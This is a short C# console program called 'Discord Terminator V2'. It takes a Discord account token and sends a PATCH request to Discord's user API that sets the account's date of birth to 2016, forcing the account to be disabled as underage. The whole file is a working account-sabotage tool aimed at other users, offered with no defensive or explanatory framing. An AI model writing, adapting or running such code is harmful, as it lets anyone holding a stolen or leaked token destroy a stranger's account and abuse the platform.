using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace DiscordTerminatorV2
{
    class Program
    {
        static bool DisableAccount(string token)
        {
            HttpClient client = new HttpClient();
            client.DefaultRequestHeaders.Add("Authorization", token);

            var response = client.PatchAsync("https://discordapp.com/api/v6/users/@me", new StringContent("{\"date_of_birth\":\"2016-2-14\"}"));

            return response.Result.StatusCode == System.Net.HttpStatusCode.OK;
        }
        static void Main(string[] args)
        {
            Console.Title = "Discord Terminator V2";
            Console.WriteLine("Enter Token: ");
            string token = Console.ReadLine();
            if (DisableAccount(token))  Console.WriteLine("Successfully disabled that account.");
            else Console.WriteLine("An error occurred while disabling that account, are you sure it's a valid token?");
            Console.ReadLine();
        }
    }
}
